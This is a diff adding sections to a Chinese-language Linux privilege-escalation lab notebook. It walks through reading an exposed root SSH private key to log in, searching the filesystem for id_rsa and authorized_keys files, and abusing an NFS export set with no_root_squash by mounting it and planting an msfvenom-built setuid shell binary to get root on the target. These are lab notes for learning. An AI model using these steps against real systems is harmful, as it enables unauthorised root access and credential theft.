@@ -1660,3 +1660,150 @@ root@RedteamNotes:/home/user# whoami
 root
 ```
 
+### SSH 密钥敏感信息提取
+
+此内容仅有文字参考，实战内容后续有机会则补齐。
+
+查看根目录发现有 .ssh 文件夹。
+
+```sh
+ls -liah /
+```
+
+查看 .ssh 的内容发现有 root_kty。
+
+```bash
+user@debian:~$ ls -liah /.ssh
+ total 12K 
+ 1175041 drwxr-xr-x 
+	2 root root 4.0K Aug 25 2019 .
+	2 drwxr-xr-x 22 root root 4.0K Aug 25 2019 .. 
+	1175042 -rw-r--r-- 1 root root 1.7K Aug 25 2019 root_key
+```
+
+查看 root_key。
+
+```bash
+cat /.ssh/root_kty
+-----BEGIN RSA PRIVATE KEY-----
+
+...
+
+...
+
+-----END RSA PRIVATE KEY-----
+```
+
+在 kali 中使用 id_rsa 进行登入。
+
+```bash
+┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
+└─$ vim id_rsa 
+┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
+└─$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+
+...
+
+...
+
+-----END RSA PRIVATE KEY-----
+┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
+└─$ sudo chmod 600 id_rsa 
+┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
+└─$ ls -liah id_rsa 
+922104 -rw------- 1 kali kali 1.7K May 15 03:15 id_rsa 
+┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
+└─$ ssh -i id_rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa
+...
+...
+```
+
+相关的备用搜索命令。
+
+```bash
+find / -name authorized_keys 2>/dev/null
+```
+
+```bash
+find / -name id_rsa 2>/dev/null
+```
+
+### NFS 提权
+
+查看 `/etc/export` 文件。
+
+```bash
+user@RedteamNotes:~$ cat /etc/exports 
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+#/tmp *(rw,sync,insecure,no_subtree_check)
+```
+
+`no_root_squash` 是 NFS（Network File System）共享设置中的一个选项。它的作用是允许 root 用户在 NFS 客户端机器上拥有和在 NFS 服务器上相同的权限。
+
+默认情况下，NFS 使用 `root_squash` 选项，这意味着在 NFS 客户端上，root 用户的所有请求都被映射为一个匿名用户（通常是 `nobody` 或 `nfsnobody` ），这样可以防止客户端的 root 用户在 NFS 共享上进行任意操作。
+
+然而如果设置了 `no_root_squash` 选项，在 NFS 客户端上的用户就可以像在本地文件系统上一样，拥有对 NFS 共享的完全控制权限。这在某些情况下可能是必要的，但也可能引入安全风险，因为任何可以在客户端获取 root 权限的用户都可以在 NFS 共享上进行任意操作。
+
+`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)` 的意思为：所有主机都能访问 `/tmp` 目录，并且它们可以进行读写（rw），所有的写操作立即生效（sync），允许使用非保留端口链接（insecure），不希望将 root 用户映照为 匿名用户（no_root_squash），并且不希望进行子树检查（no_subtree_check）。
+
+在 kali 中执行下面操作。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo su                    
+[sudo] password for kali: 
+┌──(root㉿kali)-[/home/kali/Work/Kali]
+└─# mkdir /tmp/nfs
+                                                                                                       
+┌──(root㉿kali)-[/home/kali/Work/Kali]
+└─# mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs
+Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
+                                                                                                       
+┌──(root㉿kali)-[/home/kali/Work/Kali]
+└─# cd /tmp/nfs  
+┌──(root㉿kali)-[/tmp/nfs]
+└─# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell1.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 48 bytes
+Final size of elf file: 132 bytes
+Saved as: /tmp/nfs/shell1.elf
+                                                                                                       
+┌──(root㉿kali)-[/tmp/nfs]
+└─# ls -liah shell1.elf                                                        
+1158726 -rw-r--r-- 1 root root 132 Jan 16 07:46 shell1.elf
+                                                                                                       
+┌──(root㉿kali)-[/tmp/nfs]
+└─# chmod +xs shell1.elf
+```
+
+在靶机中执行下面操作。
+
+```bash
+user@RedteamNotes:~$ ls -liah /tmp/shell1.elf 
+1158726 -rwsr-sr-x 1 root root 132 Jan 16 07:46 /tmp/shell1.elf
+user@RedteamNotes:~$ /tmp/shell1.elf
+bash-4.1# whoami
+root
+```
+
+因为我们在 kali 中是 root，所以执行的命令映射到靶机中也是 root，以 root 身份执行了 `/bin/bash -p` 获得 root 权限。
+
+### 内核提权
+
+可以参考我的文章 [Lampiao Writeup](https://enilmalus.github.io/posts/lampiao-writeup/)
+
